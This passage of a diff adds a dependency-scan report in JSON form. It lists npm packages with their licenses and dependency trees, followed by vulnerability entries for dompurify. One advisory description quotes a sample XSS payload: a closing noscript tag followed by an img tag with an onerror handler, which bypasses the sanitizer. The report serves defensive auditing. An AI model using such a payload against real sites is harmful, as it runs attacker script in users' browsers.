+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-path@3.1.0",
+          "Name": "d3-path",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-path@3.1.0",
+            "UID": "7d5b907c7fb2c772"
+          },
+          "Version": "3.1.0",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3086,
+              "EndLine": 3094
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-scale@4.0.2",
+          "Name": "d3-scale",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-scale@4.0.2",
+            "UID": "270c9d9edef84104"
+          },
+          "Version": "4.0.2",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "d3-array@3.2.4",
+            "d3-format@3.1.2",
+            "d3-interpolate@3.0.1",
+            "d3-time-format@4.1.0",
+            "d3-time@3.1.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3095,
+              "EndLine": 3110
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-selection@3.0.0",
+          "Name": "d3-selection",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-selection@3.0.0",
+            "UID": "b2003bd0a5d925b1"
+          },
+          "Version": "3.0.0",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3111,
+              "EndLine": 3119
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-shape@3.2.0",
+          "Name": "d3-shape",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-shape@3.2.0",
+            "UID": "cac4371a1272fab5"
+          },
+          "Version": "3.2.0",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "d3-path@3.1.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3120,
+              "EndLine": 3131
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-time@3.1.0",
+          "Name": "d3-time",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-time@3.1.0",
+            "UID": "80ed35932ede267"
+          },
+          "Version": "3.1.0",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "d3-array@3.2.4"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3132,
+              "EndLine": 3143
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-time-format@4.1.0",
+          "Name": "d3-time-format",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-time-format@4.1.0",
+            "UID": "614706685b04125f"
+          },
+          "Version": "4.1.0",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "d3-time@3.1.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3144,
+              "EndLine": 3155
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-timer@3.0.1",
+          "Name": "d3-timer",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-timer@3.0.1",
+            "UID": "aafb402c112a247"
+          },
+          "Version": "3.0.1",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3156,
+              "EndLine": 3164
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-transition@3.0.1",
+          "Name": "d3-transition",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-transition@3.0.1",
+            "UID": "a6a73c0a3364503a"
+          },
+          "Version": "3.0.1",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "d3-color@3.1.0",
+            "d3-dispatch@3.0.1",
+            "d3-ease@3.0.1",
+            "d3-interpolate@3.0.1",
+            "d3-selection@3.0.0",
+            "d3-timer@3.0.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3165,
+              "EndLine": 3183
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-zoom@3.0.0",
+          "Name": "d3-zoom",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-zoom@3.0.0",
+            "UID": "eacf0e5b0f84d478"
+          },
+          "Version": "3.0.0",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "d3-dispatch@3.0.1",
+            "d3-drag@3.0.0",
+            "d3-interpolate@3.0.1",
+            "d3-selection@3.0.0",
+            "d3-transition@3.0.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3184,
+              "EndLine": 3199
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "decimal.js-light@2.5.1",
+          "Name": "decimal.js-light",
+          "Identifier": {
+            "PURL": "pkg:npm/decimal.js-light@2.5.1",
+            "UID": "3bd050ff839466"
+          },
+          "Version": "2.5.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3239,
+              "EndLine": 3244
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "delayed-stream@1.0.0",
+          "Name": "delayed-stream",
+          "Identifier": {
+            "PURL": "pkg:npm/delayed-stream@1.0.0",
+            "UID": "9f3314ce6443ef36"
+          },
+          "Version": "1.0.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3262,
+              "EndLine": 3270
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "dompurify@3.2.7",
+          "Name": "dompurify",
+          "Identifier": {
+            "PURL": "pkg:npm/dompurify@3.2.7",
+            "UID": "f3c18d1d40b2f032"
+          },
+          "Version": "3.2.7",
+          "Licenses": [
+            "(MPL-2.0 OR Apache-2.0)"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@types/trusted-types@2.0.7"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3303,
+              "EndLine": 3312
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "dunder-proto@1.0.1",
+          "Name": "dunder-proto",
+          "Identifier": {
+            "PURL": "pkg:npm/dunder-proto@1.0.1",
+            "UID": "44c2ca00de47654e"
+          },
+          "Version": "1.0.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "call-bind-apply-helpers@1.0.2",
+            "es-errors@1.3.0",
+            "gopd@1.2.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3313,
+              "EndLine": 3326
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "es-define-property@1.0.1",
+          "Name": "es-define-property",
+          "Identifier": {
+            "PURL": "pkg:npm/es-define-property@1.0.1",
+            "UID": "21d41c53dd9b87d9"
+          },
+          "Version": "1.0.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3347,
+              "EndLine": 3355
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "es-errors@1.3.0",
+          "Name": "es-errors",
+          "Identifier": {
+            "PURL": "pkg:npm/es-errors@1.3.0",
+            "UID": "6dd3438cc644fac7"
+          },
+          "Version": "1.3.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3356,
+              "EndLine": 3364
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "es-object-atoms@1.1.1",
+          "Name": "es-object-atoms",
+          "Identifier": {
+            "PURL": "pkg:npm/es-object-atoms@1.1.1",
+            "UID": "718cfdcec7ade408"
+          },
+          "Version": "1.1.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "es-errors@1.3.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3372,
+              "EndLine": 3383
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "es-set-tostringtag@2.1.0",
+          "Name": "es-set-tostringtag",
+          "Identifier": {
+            "PURL": "pkg:npm/es-set-tostringtag@2.1.0",
+            "UID": "b193c7cda6311c4c"
+          },
+          "Version": "2.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "es-errors@1.3.0",
+            "get-intrinsic@1.3.0",
+            "has-tostringtag@1.0.2",
+            "hasown@2.0.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3384,
+              "EndLine": 3398
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "es-toolkit@1.44.0",
+          "Name": "es-toolkit",
+          "Identifier": {
+            "PURL": "pkg:npm/es-toolkit@1.44.0",
+            "UID": "7a9a1fbf975f51f7"
+          },
+          "Version": "1.44.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3399,
+              "EndLine": 3408
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "eventemitter3@5.0.4",
+          "Name": "eventemitter3",
+          "Identifier": {
+            "PURL": "pkg:npm/eventemitter3@5.0.4",
+            "UID": "dde91cfb22fd1665"
+          },
+          "Version": "5.0.4",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3658,
+              "EndLine": 3663
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "follow-redirects@1.16.0",
+          "Name": "follow-redirects",
+          "Identifier": {
+            "PURL": "pkg:npm/follow-redirects@1.16.0",
+            "UID": "c21fe30be18891d8"
+          },
+          "Version": "1.16.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3799,
+              "EndLine": 3818
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "form-data@4.0.5",
+          "Name": "form-data",
+          "Identifier": {
+            "PURL": "pkg:npm/form-data@4.0.5",
+            "UID": "5a8f7ac02433834"
+          },
+          "Version": "4.0.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "asynckit@0.4.0",
+            "combined-stream@1.0.8",
+            "es-set-tostringtag@2.1.0",
+            "hasown@2.0.2",
+            "mime-types@2.1.35"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3819,
+              "EndLine": 3834
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "function-bind@1.1.2",
+          "Name": "function-bind",
+          "Identifier": {
+            "PURL": "pkg:npm/function-bind@1.1.2",
+            "UID": "4bafc19af1fbd2e0"
+          },
+          "Version": "1.1.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3864,
+              "EndLine": 3872
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "get-intrinsic@1.3.0",
+          "Name": "get-intrinsic",
+          "Identifier": {
+            "PURL": "pkg:npm/get-intrinsic@1.3.0",
+            "UID": "dcede5e784dc4266"
+          },
+          "Version": "1.3.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "call-bind-apply-helpers@1.0.2",
+            "es-define-property@1.0.1",
+            "es-errors@1.3.0",
+            "es-object-atoms@1.1.1",
+            "function-bind@1.1.2",
+            "get-proto@1.0.1",
+            "gopd@1.2.0",
+            "has-symbols@1.1.0",
+            "hasown@2.0.2",
+            "math-intrinsics@1.1.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3883,
+              "EndLine": 3906
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "get-proto@1.0.1",
+          "Name": "get-proto",
+          "Identifier": {
+            "PURL": "pkg:npm/get-proto@1.0.1",
+            "UID": "8285a6cf121fea2"
+          },
+          "Version": "1.0.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "dunder-proto@1.0.1",
+            "es-object-atoms@1.1.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3907,
+              "EndLine": 3919
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "gopd@1.2.0",
+          "Name": "gopd",
+          "Identifier": {
+            "PURL": "pkg:npm/gopd@1.2.0",
+            "UID": "ae5d9b2ea4a507cf"
+          },
+          "Version": "1.2.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3946,
+              "EndLine": 3957
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "has-symbols@1.1.0",
+          "Name": "has-symbols",
+          "Identifier": {
+            "PURL": "pkg:npm/has-symbols@1.1.0",
+            "UID": "4dde762b004e5c9e"
+          },
+          "Version": "1.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3968,
+              "EndLine": 3979
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "has-tostringtag@1.0.2",
+          "Name": "has-tostringtag",
+          "Identifier": {
+            "PURL": "pkg:npm/has-tostringtag@1.0.2",
+            "UID": "65bbfbe24e0f97eb"
+          },
+          "Version": "1.0.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "has-symbols@1.1.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3980,
+              "EndLine": 3994
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "hasown@2.0.2",
+          "Name": "hasown",
+          "Identifier": {
+            "PURL": "pkg:npm/hasown@2.0.2",
+            "UID": "50a7f55d557a30f4"
+          },
+          "Version": "2.0.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "function-bind@1.1.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3995,
+              "EndLine": 4006
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "immer@10.2.0",
+          "Name": "immer",
+          "Identifier": {
+            "PURL": "pkg:npm/immer@10.2.0",
+            "UID": "bacf1bbafe979779"
+          },
+          "Version": "10.2.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 4071,
+              "EndLine": 4080
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "immer@11.1.4",
+          "Name": "immer",
+          "Identifier": {
+            "PURL": "pkg:npm/immer@11.1.4",
+            "UID": "ce11a4d4aa955cfb"
+          },
+          "Version": "11.1.4",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1232,
+              "EndLine": 1241
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "internmap@2.0.3",
+          "Name": "internmap",
+          "Identifier": {
+            "PURL": "pkg:npm/internmap@2.0.3",
+            "UID": "2b6c1af84eeefc"
+          },
+          "Version": "2.0.3",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 4118,
+              "EndLine": 4126
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "js-tokens@4.0.0",
+          "Name": "js-tokens",
+          "Identifier": {
+            "PURL": "pkg:npm/js-tokens@4.0.0",
+            "UID": "2942cf329a107a93"
+          },
+          "Version": "4.0.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 4213,
+              "EndLine": 4218
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "loose-envify@1.4.0",
+          "Name": "loose-envify",
+          "Identifier": {
+            "PURL": "pkg:npm/loose-envify@1.4.0",
+            "UID": "aa59e829a0d92c28"
+          },
+          "Version": "1.4.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "js-tokens@4.0.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 4387,
+              "EndLine": 4398
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "marked@14.0.0",
+          "Name": "marked",
+          "Identifier": {
+            "PURL": "pkg:npm/marked@14.0.0",
+            "UID": "1692d410490f888d"
+          },
+          "Version": "14.0.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 4446,
+              "EndLine": 4458
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "math-intrinsics@1.1.0",
+          "Name": "math-intrinsics",
+          "Identifier": {
+            "PURL": "pkg:npm/math-intrinsics@1.1.0",
+            "UID": "a356c7a1cf875c30"
+          },
+          "Version": "1.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 4459,
+              "EndLine": 4467
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "mime-db@1.52.0",
+          "Name": "mime-db",
+          "Identifier": {
+            "PURL": "pkg:npm/mime-db@1.52.0",
+            "UID": "62b365656e396a11"
+          },
+          "Version": "1.52.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 4492,
+              "EndLine": 4500
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "mime-types@2.1.35",
+          "Name": "mime-types",
+          "Identifier": {
+            "PURL": "pkg:npm/mime-types@2.1.35",
+            "UID": "90bc0f57ec5c6c8a"
+          },
+          "Version": "2.1.35",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "mime-db@1.52.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 4501,
+              "EndLine": 4512
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "monaco-editor@0.55.1",
+          "Name": "monaco-editor",
+          "Identifier": {
+            "PURL": "pkg:npm/monaco-editor@0.55.1",
+            "UID": "bb6ec07c7fed818c"
+          },
+          "Version": "0.55.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "dompurify@3.2.7",
+            "marked@14.0.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 4536,
+              "EndLine": 4546
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "proxy-from-env@2.1.0",
+          "Name": "proxy-from-env",
+          "Identifier": {
+            "PURL": "pkg:npm/proxy-from-env@2.1.0",
+            "UID": "6326f79bb1efc150"
+          },
+          "Version": "2.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 4999,
+              "EndLine": 5007
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "react-is@17.0.2",
+          "Name": "react-is",
+          "Identifier": {
+            "PURL": "pkg:npm/react-is@17.0.2",
+            "UID": "cb241a5353a124d7"
+          },
+          "Version": "17.0.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 5084,
+              "EndLine": 5090
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "react-redux@9.2.0",
+          "Name": "react-redux",
+          "Identifier": {
+            "PURL": "pkg:npm/react-redux@9.2.0",
+            "UID": "51984ea0fe5c7bd6"
+          },
+          "Version": "9.2.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@types/react@18.3.28",
+            "@types/use-sync-external-store@0.0.6",
+            "react@18.3.1",
+            "redux@5.0.1",
+            "use-sync-external-store@1.6.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 5091,
+              "EndLine": 5113
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "react-router@6.30.3",
+          "Name": "react-router",
+          "Identifier": {
+            "PURL": "pkg:npm/react-router@6.30.3",
+            "UID": "53814691ef3db169"
+          },
+          "Version": "6.30.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@remix-run/router@1.23.2",
+            "react@18.3.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 5124,
+              "EndLine": 5138
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "redux@5.0.1",
+          "Name": "redux",
+          "Identifier": {
+            "PURL": "pkg:npm/redux@5.0.1",
+            "UID": "f9ef098f51711d0"
+          },
+          "Version": "5.0.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 5223,
+              "EndLine": 5228
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "redux-thunk@3.1.0",
+          "Name": "redux-thunk",
+          "Identifier": {
+            "PURL": "pkg:npm/redux-thunk@3.1.0",
+            "UID": "87613cf0f2789549"
+          },
+          "Version": "3.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "redux@5.0.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 5229,
+              "EndLine": 5237
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "reselect@5.1.1",
+          "Name": "reselect",
+          "Identifier": {
+            "PURL": "pkg:npm/reselect@5.1.1",
+            "UID": "8213f7c029a79312"
+          },
+          "Version": "5.1.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 5245,
+              "EndLine": 5250
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "scheduler@0.23.2",
+          "Name": "scheduler",
+          "Identifier": {
+            "PURL": "pkg:npm/scheduler@0.23.2",
+            "UID": "25a96c3cf983ad55"
+          },
+          "Version": "0.23.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "loose-envify@1.4.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 5389,
+              "EndLine": 5397
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "state-local@1.0.7",
+          "Name": "state-local",
+          "Identifier": {
+            "PURL": "pkg:npm/state-local@1.0.7",
+            "UID": "ef757485beee82d3"
+          },
+          "Version": "1.0.7",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 5455,
+              "EndLine": 5460
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "tiny-invariant@1.3.3",
+          "Name": "tiny-invariant",
+          "Identifier": {
+            "PURL": "pkg:npm/tiny-invariant@1.3.3",
+            "UID": "ebb5f86fbe27d5c3"
+          },
+          "Version": "1.3.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 5621,
+              "EndLine": 5626
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "use-sync-external-store@1.6.0",
+          "Name": "use-sync-external-store",
+          "Identifier": {
+            "PURL": "pkg:npm/use-sync-external-store@1.6.0",
+            "UID": "50f7f5c43e4c2dae"
+          },
+          "Version": "1.6.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "react@18.3.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 5894,
+              "EndLine": 5902
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "victory-vendor@37.3.6",
+          "Name": "victory-vendor",
+          "Identifier": {
+            "PURL": "pkg:npm/victory-vendor@37.3.6",
+            "UID": "df6a3fc817e8458"
+          },
+          "Version": "37.3.6",
+          "Licenses": [
+            "MIT AND ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@types/d3-array@3.2.2",
+            "@types/d3-ease@3.0.2",
+            "@types/d3-interpolate@3.0.4",
+            "@types/d3-scale@4.0.9",
+            "@types/d3-shape@3.1.8",
+            "@types/d3-time@3.0.4",
+            "@types/d3-timer@3.0.2",
+            "d3-array@3.2.4",
+            "d3-ease@3.0.1",
+            "d3-interpolate@3.0.1",
+            "d3-scale@4.0.2",
+            "d3-shape@3.2.0",
+            "d3-time@3.1.0",
+            "d3-timer@3.0.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 5910,
+              "EndLine": 5931
+            }
+          ],
+          "AnalyzedBy": "npm"
+        }
+      ],
+      "Vulnerabilities": [
+        {
+          "VulnerabilityID": "CVE-2026-0540",
+          "VendorIDs": [
+            "GHSA-v2wj-7wpq-c8vv"
+          ],
+          "PkgID": "dompurify@3.2.7",
+          "PkgName": "dompurify",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/dompurify@3.2.7",
+            "UID": "f3c18d1d40b2f032"
+          },
+          "InstalledVersion": "3.2.7",
+          "FixedVersion": "3.3.2, 2.5.9",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-0540",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:02d2c8326ee3d8f492c81c1bcd7700ad5b9bdd0f1e62d06eb1285c1307edf58f",
+          "Title": "DOMPurify: DOMPurify: Cross-site scripting vulnerability",
+          "Description": "DOMPurify 3.1.3 through 3.3.1 and 2.5.3 through 2.5.8, fixed in commit 2726c74, contain a cross-site scripting vulnerability that allows attackers to bypass attribute sanitization by exploiting five missing rawtext elements (noscript, xmp, noembed, noframes, iframe) in the SAFE_FOR_XML regex. Attackers can include payloads like \u003c/noscript\u003e\u003cimg src=x onerror=alert(1)\u003e in attribute values to execute JavaScript when sanitized output is placed inside these unprotected rawtext contexts.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-79"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N",
+              "V3Score": 6.1,
+              "V40Score": 5.1
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+              "V3Score": 6.1
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-0540",
+            "https://fluidattacks.com/advisories/daft",
+            "https://github.com/cure53/DOMPurify",
+            "https://github.com/cure53/DOMPurify/commit/302b51de22535cc90235472c52e3401bedd46f80",
+            "https://github.com/cure53/DOMPurify/commit/fca0a938b4261ddc9c0293a289935a9029c049f5",
+            "https://github.com/cure53/DOMPurify/releases/tag/3.3.2",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-0540",
+            "https://www.cve.org/CVERecord?id=CVE-2026-0540",
+            "https://www.vulncheck.com/advisories/dompurify-xss-via-missing-rawtext-elements-in-safe-for-xml",
+            "https://www.vulncheck.com/advisories/dompurify-xss-via-missing-rawtext-elements-in-safeforxml"
+          ],
+          "PublishedDate": "2026-03-03T18:16:24.457Z",
+          "LastModifiedDate": "2026-03-25T16:16:10.06Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-41238",
+          "VendorIDs": [
+            "GHSA-v9jr-rg53-9pgp"
+          ],
+          "PkgID": "dompurify@3.2.7",
+          "PkgName": "dompurify",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/dompurify@3.2.7",
+            "UID": "f3c18d1d40b2f032"
+          },
+          "InstalledVersion": "3.2.7",
+          "FixedVersion": "3.4.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-41238",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
